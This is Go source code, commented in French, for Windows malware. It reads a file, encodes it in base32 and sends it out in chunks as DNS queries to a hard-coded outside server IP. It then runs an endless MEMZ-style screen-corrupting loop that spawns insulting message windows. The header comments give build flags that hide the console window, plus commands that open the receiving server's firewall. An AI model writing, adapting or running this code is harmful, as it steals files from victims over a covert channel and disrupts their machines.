/*
TODO :
plus de fichier en entrée

A la fin viré la gestion d'erreur



Compiler en mode GUI pas en console pour ne pas avoir de cmd ouvert :
GOOS=windows GOARCH=amd64 go build -ldflags "-H windowsgui" -o test.exe main.go

Ouvrir les iptables du srv :
sudo iptables -F
sudo iptables -P INPUT ACCEPT
sudo iptables -P OUTPUT ACCEPT

*/

package main

import (
	"encoding/base32"
	"fmt"
	"io"
	"math/rand"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/miekg/dns"

	"golang.org/x/sys/windows"
)

var (
	// Chargement des bibliothèques
	user32 = windows.NewLazySystemDLL("user32.dll")
	gdi32  = windows.NewLazySystemDLL("gdi32.dll")

	// Fonctions de user32.dll
	getSystemMetrics = user32.NewProc("GetSystemMetrics")
	getDC            = user32.NewProc("GetDC")
	releaseDC        = user32.NewProc("ReleaseDC")

	// Fonctions de gdi32.dll
	createCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	deleteDC               = gdi32.NewProc("DeleteDC")
	createCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	selectObject           = gdi32.NewProc("SelectObject")
	deleteObject           = gdi32.NewProc("DeleteObject")
	bitBlt                 = gdi32.NewProc("BitBlt")
	stretchBlt             = gdi32.NewProc("StretchBlt")

	//pour les msg derreur
	createWindowEx = user32.NewProc("CreateWindowExW")
	showWindow     = user32.NewProc("ShowWindow")
	setText        = user32.NewProc("SetWindowTextW")
	textOut        = user32.NewProc("TextOutW")
)

const (
	WS_OVERLAPPEDWINDOW = 0x00CF0000
	WS_VISIBLE          = 0x10000000
	SW_SHOWNORMAL       = 1
)

// Constantes pour GetSystemMetrics
const (
	SM_CXSCREEN = 0 // Largeur de l'écran principal
	SM_CYSCREEN = 1 // Hauteur de l'écran principal
)

// GetSystemMetrics retourne les dimensions de l'écran
func GetSystemMetrics(nIndex int) int32 {
	ret, _, _ := getSystemMetrics.Call(uintptr(nIndex))
	return int32(ret)
}

//debut des fonctions memz

// MEMZEffect applique l'effet tunnel
func MEMZEffect(hdcScreen, hdcMem uintptr, screenWidth, screenHeight int32) {
	// Effet de tunnel
	for i := 0; i < 20; i++ {
		newWidth := screenWidth - int32(i)*(screenWidth/20)
		newHeight := screenHeight - int32(i)*(screenHeight/20)
		offsetX := (screenWidth - newWidth) / 2
		offsetY := (screenHeight - newHeight) / 2

		stretchBlt.Call(
			hdcScreen,
			uintptr(offsetX), uintptr(offsetY), uintptr(newWidth), uintptr(newHeight),
			hdcMem, 0, 0, uintptr(screenWidth), uintptr(screenHeight),
			uintptr(0x00CC0020), // SRCCOPY = 0x00CC0020
		)
	}
}

func createMessageWindow(text string) uintptr {
	rand.Seed(time.Now().UnixNano()) // Initialiser le générateur de nombres aléatoires

	// Générer des positions aléatoires pour X et Y
	x := rand.Intn(800) // Plage de position X (ajuste en fonction de la résolution)
	y := rand.Intn(600) // Plage de position Y (ajuste en fonction de la résolution)

	className := syscall.StringToUTF16Ptr("Static")
	windowName := syscall.StringToUTF16Ptr(text)

	hwnd, _, _ := createWindowEx.Call(
		0,                                   // ExStyle
		uintptr(unsafe.Pointer(className)),  // ClassName
		uintptr(unsafe.Pointer(windowName)), // WindowName
		WS_OVERLAPPEDWINDOW|WS_VISIBLE,      // Style
		uintptr(x), uintptr(y), 500, 100,    // Position (X, Y, Width, Height)
		0, 0, 0, 0, // Parent, Menu, Instance, Param
	)
	return hwnd
}

func start_destruction() {

	// Obtenir le contexte de l'écran principal
	hdcScreen, _, _ := getDC.Call(0)
	if hdcScreen == 0 {
		fmt.Println("Erreur : Impossible d'obtenir le contexte de l'écran")
		return
	}
	defer releaseDC.Call(0, hdcScreen)

	// Récupérer la taille de l'écran
	screenWidth := GetSystemMetrics(SM_CXSCREEN)
	screenHeight := GetSystemMetrics(SM_CYSCREEN)

	// Créer un contexte mémoire pour stocker une copie de l'écran
	hdcMem, _, _ := createCompatibleDC.Call(hdcScreen)
	if hdcMem == 0 {
		fmt.Println("Erreur : Impossible de créer un DC compatible")
		return
	}
	defer deleteDC.Call(hdcMem)

	// Créer une bitmap compatible pour capturer l'écran
	hBitmap, _, _ := createCompatibleBitmap.Call(hdcScreen, uintptr(screenWidth), uintptr(screenHeight))
	if hBitmap == 0 {
		fmt.Println("Erreur : Impossible de créer une Bitmap compatible")
		return
	}
	defer deleteObject.Call(hBitmap)

	// Sélectionner la bitmap dans le contexte mémoire
	selectObject.Call(hdcMem, hBitmap)

	// Capturer l'écran une fois au début
	bitBlt.Call(hdcMem, 0, 0, uintptr(screenWidth), uintptr(screenHeight), hdcScreen, 0, 0, uintptr(0x00CC0020)) // SRCCOPY = 0x00CC0020

	// Boucle infinie pour l'effet continu
	for {
		// Appliquer l'effet MEMZ
		MEMZEffect(hdcScreen, hdcMem, screenWidth, screenHeight)

		hwnd := createMessageWindow("Ta mère la chauve")

		// Afficher la fenêtre
		showWindow.Call(hwnd, SW_SHOWNORMAL)

		time.Sleep(25 * time.Millisecond) // Délai pour lisser l'effet
	}

}

//fin fonction MEMZ

func steal_data() {

	// fichier a voler
	filePath := "test.txt"

	// Encode le texte en base32 (sans padding pour un domaine valide)
	//encodedText1 := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(text))

	// Encoder le fichier en base32
	encoded, err := encodeFileToBase32(filePath)
	if err != nil {
		fmt.Println("Erreur :", err)
		return
	}

	encoded_with_dots := Dot38Chars(encoded)

	// Séparer le texte en segments à partir des points
	segments := strings.Split(encoded_with_dots, ".")

	// regarde les segments par paquets de 2
	for i := 0; i < len(segments); i += 2 {
		// vérif si on a deux segments ou un seul
		if i+1 < len(segments) {
			// Prendre deux segments et les joindre avec un point et en ajoute un a la fin pour pouvoir envoyer la requests
			data := segments[i] + "." + segments[i+1] + "."

			createDNSRequest(data)

		} else {
			// Si il reste que un segemnt l'envoyer et ajoute un autre point a la fin pour pouvoir envoyer la requests
			data := segments[i] + "."

			createDNSRequest(data)
		}
	}

	// Pour signaler au srv que l'envoie de data est terminé et que il commence à décodé
	createDNSRequest("mvxgi.mvxgi.")

}

func encodeFileToBase32(filePath string) (string, error) {
	// Ouvrir le fichier à envoyé
	file, err := os.Open(filePath)
	if err != nil {
		return "", fmt.Errorf("impossible d'ouvrir le fichier : %w", err)
	}
	defer file.Close()

	// Lire tout le contenu du fichier
	content, err := io.ReadAll(file)
	if err != nil {
		return "", fmt.Errorf("erreur lors de la lecture du fichier : %w", err)
	}

	// Encoder le contenu en base32
	base32Encoded := base32.StdEncoding.EncodeToString(content)

	return base32Encoded, nil
}

func Dot38Chars(text string) string {
	result := ""
	for len(text) > 38 {
		// Prend les 38 premier char et ajoute un point (la limite est à 39 mais je compte le point en +)
		result += text[:38] + "."
		// Réduit la chaîne restante
		text = text[38:]
	}
	// Ajoute le reste de la chaîne
	result += text
	return result
}

func createDNSRequest(encoded string) {
	// Adresse du serveur DNS et msg à envoyé
	dnsServer := "158.178.205.165:5353"
	domain := encoded

	// Créer la requête DNS
	message := new(dns.Msg)
	message.SetQuestion(domain, dns.TypeA)

	// Créer un client DNS
	client := new(dns.Client)
	client.Net = "udp" // Utiliser UDP comme protocole (par défaut)

	// Envoyer la requête
	resp, _, err := client.Exchange(message, dnsServer)
	if err != nil {
		fmt.Println("Erreur lors de la requête DNS :", err)
		return
	}

	// Afficher la réponse si elle est reçue
	fmt.Println(resp.String())
}

func main() {
	steal_data()

	start_destruction()
}
